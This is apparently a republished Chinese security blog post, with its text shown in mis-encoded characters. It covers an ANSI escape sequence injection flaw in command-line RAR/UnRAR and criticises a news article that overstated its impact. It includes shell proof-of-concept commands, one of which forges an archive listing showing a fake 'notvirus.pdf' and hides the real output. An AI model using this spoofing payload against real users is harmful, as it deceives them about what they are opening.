---
title: CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence æ³¨å…¥æ¼æ´
url: https://buaq.net/go-241630.html
source: unSafe.sh - ä¸å®‰å…¨
date: 2024-05-27
fetch_date: 2025-10-06T16:49:07.120919
---

# CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence æ³¨å…¥æ¼æ´

* [unSafe.sh - ä¸å®‰å…¨](https://unsafe.sh)
* [æˆ‘çš„æ”¶è—](/user/collects)
* [ä»Šæ—¥çƒ­æ¦œ](/?hot=true)
* [å…¬ä¼—å·æ–‡ç« ](/?gzh=true)
* [å¯¼èˆª](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [ç¼–ç /è§£ç ](/encode)
* [æ–‡ä»¶ä¼ è¾“](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
é»‘å¤œæ¨¡å¼

![](https://8aqnet.cdn.bcebos.com/143c97c32aafc42e8b0046057b87f3cd.jpg)

CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence æ³¨å…¥æ¼æ´

*2024-5-26 21:33:37
Author: [programlife.net(æŸ¥çœ‹åŸæ–‡)](/jump-241630.htm)
é˜…è¯»é‡:36
æ”¶è—*

---

* [Categories](https://programlife.net/categories/)
* [Archives](https://programlife.net/archives/)
* [Tags](https://programlife.net/tags/)
* [About](https://programlife.net/about/)
* [Sitemap](https://programlife.net/sitemap.xml)

ä» CVE-2024-33899 çœ‹**åƒåœ¾è‹±æ–‡å°ç¼–**æ±¡æŸ“ç®€ä½“ä¸­æ–‡äº’è”ç½‘ğŸ¤¡

## 0x01. æ¼æ´ç®€ä»‹

WinRAR é‡Œé¢å­˜åœ¨çš„ [Escape Sequence](https://programlife.net/tags/Escape-Sequence/) æ³¨å…¥æ¼æ´ï¼Œå½±å“å‘½ä»¤è¡Œç‰ˆæœ¬çš„ RAR å’Œ UnRARï¼š

* Windows CVE-2024â€“36052
* Linux/Unix CVE-2024â€“33899

PoC æµ‹è¯•ï¼š

```
cd /tmp
wget https://www.win-rar.com/fileadmin/winrar-versions/rarlinux-x64-624.tar.gz
tar -xzf rarlinux-x64-624.tar.gz
cd rar
./rar a demo.rar readme.txt
printf 'Hello \033[32mTHIS IS GREEN\033[0m\007' | ./rar c demo.rar
./rar l demo.rar
```

![CVE-2024-33899 WinRAR RAR/UnRAR Escape Sequence æ³¨å…¥æ¼æ´](https://programlife.net/uploads/202405/winrar-escape-sequence-injection.webp)

æ¼æ´æ¯”è¾ƒé¸¡è‚‹ï¼Œå°±æ˜¯ç©ç© Escape Sequence Injectionï¼Œæ¯”å¦‚ä¼ªé€ å‹ç¼©æ–‡ä»¶åˆ—è¡¨ï¼ˆå…³é”® Payload ä¸º `\e[8m`ï¼‰ï¼š

```
printf 'Archive: demo.rar\nDetails: RAR 5\n\nAttributes      Size       Date   Time   Name\n----------- ---------  ---------- -----  ---------\n-rw-r--r--          7  2024-05-19 16:26  notvirus.pdf\n----------- ---------  ---------- -----  ---------\n                    7                    1\e[8m' | rar c demo.rar
```

å¯¹äºæŸäº›ç¯å¢ƒå¯ä»¥ DoSï¼Œå‚è€ƒ [Weaponizing Plain Text: ANSI Escape Sequences as a Forensic Nightmare](https://www.blackhat.com/us-23/briefings/schedule/#weaponizing-plain-text-ansi-escape-sequences-as-a-forensic-nightmare-31757)ã€‚

## 0x02. æ•…äº‹èµ·æº

åœ¨å¾®ä¿¡å…¬ä¼—å·çœ‹åˆ°æŸæ¡æ¨é€ï¼š

> **WinRAR æ¼æ´è®©æ”»å‡»è€…åˆ©ç”¨ ANSI è½¬ä¹‰åºåˆ—æ¬ºéª—ç”¨æˆ·**
>
> é€šè¿‡åˆ¶ä½œåŒ…å«è¿™äº›åºåˆ—çš„æ¶æ„æ¡£æ¡ˆï¼Œæ”»å‡»è€…å¯ä»¥æ“çºµæ˜¾ç¤ºçš„è¾“å‡ºå¹¶æ¬ºéª—ç”¨æˆ·ç›¸ä¿¡ä»–ä»¬æ­£åœ¨æ‰“å¼€æ— å®³çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ PDF æˆ–å›¾åƒã€‚
>
> å½“ç”¨æˆ·å°è¯•åœ¨WinRARä¸­æ‰“å¼€çœ‹ä¼¼æ— å®³çš„æ–‡ä»¶æ—¶ï¼Œç”±äºå¯¹æ–‡ä»¶æ‰©å±•åå¤„ç†ä¸å½“ï¼Œæ¼æ´å°±ä¼šè¢«è§¦å‘ã€‚
>
> Dushantha è¡¨ç¤ºï¼ŒWinRAR çš„ ShellExecute å‡½æ•°æ²¡æœ‰å¯åŠ¨é¢„æœŸçš„æ–‡ä»¶ï¼Œè€Œæ˜¯æ”¶åˆ°äº†é”™è¯¯çš„å‚æ•°å¹¶æ‰§è¡Œäº†éšè—çš„æ¶æ„è„šæœ¬ï¼Œä¾‹å¦‚æ‰¹å¤„ç†æ–‡ä»¶ (.bat) æˆ–å‘½ä»¤è„šæœ¬ (.cmd) ã€‚

çœ‹èµ·æ¥æŠŠ WinRAR æ¼æ´ CVE-2023-38831 çš„å½±å“ç§»æ¤è¿‡æ¥äº†ï¼Œè€Œä¸”è¯´æ˜¯æ¼æ´ä½œè€… Dushantha è¯´çš„ğŸ¤¡ï¼Œè¿™é‡Œæ˜¯ç›´æ¥ç¿»è¯‘äº†è‹±æ–‡å†…å®¹ï¼š

> By crafting malicious archives containing these sequences, attackers can manipulate the displayed output and deceive users into believing they are opening a harmless file, such as a PDF or image.
>
> When a user attempts to open the seemingly benign file from within WinRAR, the vulnerability is triggered due to improper handling of file extensions.
>
> Instead of launching the expected file, WinRARâ€™s ShellExecute function receives an incorrect parameter and executes a hidden malicious script, such as a batch file (.bat) or command script (.cmd), Dushantha [said](https://sdushantha.medium.com/ansi-escape-injection-vulnerability-in-winrar-a2cbfac4b983).

è¿˜ç»™å‡ºäº†ä½œè€…çš„åŸå§‹ Blogï¼Œç®€ç›´ä¸€æœ¬æ­£ç»èƒ¡è¯´å…«é“ã€‚

## 0x03. References

1. [ANSI Escape Injection Vulnerability in WinRAR | by Siddharth Dushantha | May, 2024 | Medium](https://sdushantha.medium.com/ansi-escape-injection-vulnerability-in-winrar-a2cbfac4b983)

æ–‡ç« æ¥æº: https://programlife.net/2024/05/26/cve-2024-33899-winrar-escape-sequence-injection-vulnerability/
 å¦‚æœ‰ä¾µæƒè¯·è”ç³»:admin#unsafe.sh

Â© [unSafe.sh - ä¸å®‰å…¨](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [å®‰å…¨é©¬å…‹](https://aq.mk)
* [æ˜Ÿé™…é»‘å®¢](https://xj.hk)
* [T00ls](https://t00ls.net)